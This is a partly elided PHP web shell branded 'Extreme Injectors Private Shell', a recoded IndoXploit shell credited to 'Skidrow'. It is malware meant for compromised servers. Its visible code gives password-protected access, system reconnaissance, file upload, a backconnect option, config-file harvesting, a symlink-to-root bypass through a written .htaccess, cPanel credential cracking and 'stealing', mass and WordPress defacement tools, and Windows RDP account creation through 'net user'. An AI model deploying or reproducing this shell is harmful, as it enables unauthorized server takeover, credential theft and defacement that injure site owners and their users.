<?php
$auth_pass = "48ba8138756afc71fa1b3c37fa27d2a5"; // default: zeeblaxx
session_start();
error_reporting(0);
set_time_limit(0);
...
<html>
<head>
<title>Extreme Injectors Private Shell</title>
<style type="text/css">
html {
	background: #000000;
	color: green;
...
<header>
<center><img src="https://fanart.tv/fanart/music/6da0515e-a27d-449d-84cc-00713c38a140/hdmusiclogo/skid-row-50437ff69f44f.png" width="900" height="450"></img></center>
</header>
<form method="post">
...
ECHO "<BR>";
echo "<center><font size='20px' color='red'>Extreme Injectors Private Shell</font>";
echo "<br>";
echo "System: ".php_uname()."<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
echo "Storage Space: <font color=blue>$used</font> / <font color=blue>$total</font> ( Free: <font color=blue>$freespace</font> )<br>";
...
echo "<li> <a href='?dir=$dir&do=backconnect'>Network</a> </li>";
...
if($_GET['do'] == 'upload') {
	...
	<input type='radio' name='tipe_upload' value='biasa' checked>Current Directory [ ".w($dir,"Writeable")." ] 
...
echo '<form action="?dir=$dir&do=logout" method="post">';
	...
	<font color='pink'>Email : iamskidrow@gmail.com | <a href='https://www.facebook.com/skidrow.k3ll3r' target='_blank'>Facebook</a> | <br>Twitter : <a href=#>#</a></font><br></tr></td></table></center>";
...
if($_POST['username'] and $_POST['password']){
        ...
        echo "<p align='center' dir='ltr'><font size='2'>Coded By : Skidrow</font></p>";

} elseif($_GET['do'] == 'csrfup')
{	
echo '<html>
<center><h1 style="font-size:33px;">CSRF Exploiter By IndoXPloit<br>Recoded by skidrow AR</h1><br><br>
...
elseif($_GET['do'] == 'configv2') {
	if($_POST){
		...
		foreach($user_config[1] as $user_noname) {
			...
			echo "<center><a href='?dir=$dir/noname_config'><font color=lime>Done</font></a></center>";
			}else{
...
<INPUT class=inputzbut type=submit value=setting name=send>
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By skidrow AR</textarea><br>
...
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='skidrow AR'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value='Skidrow'><br>
		<u>Domains</u>: <br>
...
echo "<br>";
	...
	echo "<center><input type='submit' value='Bypass it' name='Colii'></center>";
		if (isset($_POST['Colii'])){ system('ln -s / skidrowar.txt');
			...
			$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Bok3p = symlink("/","skidrowar.txt");
			$rt="<br><a href=skidrowar.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
	...
	echo "<center><a href='?dir=$dir/noname_config'><font color=blue>Done</font></a></center>";
...
<?php
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='skidrow' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='skidrow' placeholder='pass_baru'><br>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=blue>NoName Shell.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses deface ".$i." Cpanel by <font color=blue>NoName Shell</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by skidrow' placeholder='New Title'><br><br>
	...
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='skidrow'><br>
		<u>Domains</u>: <br>
...
echo "</center></table>";   
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by skidrow' required><br>
...
echo '<textarea cols=10 rows=10 class="inputz" readonly>'.$codi.'</textarea></center><BR><BR>';
	...
	if($_POST['auto_deface_wp']) {
		...
		<form method='post'>
		Link Config: <br>
		<textarea name='link' placeholder='http://target.com/noname_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by skidrow' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form></center>";
	}
...
";
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if($_POST['opsi'] == '1') {
				...
				$cek = exe("net user $user skidrow");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=blue>skidrow</font>] -> ";
					if($cek) {
			...
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='skidrow' required>
			<input type='text' name='pass' placeholder='password' value='skidrow' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
	...
	echo "<center>Copyright &copy; ".date("Y")." - <a href='https://www.facebook.com/skidrow.k3ll3r' target='_blank'><font color=yello>Skidrow</font></a></center>";
	echo "<center><font color='red'>Recoded IndoXploit Shell By Skidrow";
	}
?>
</html>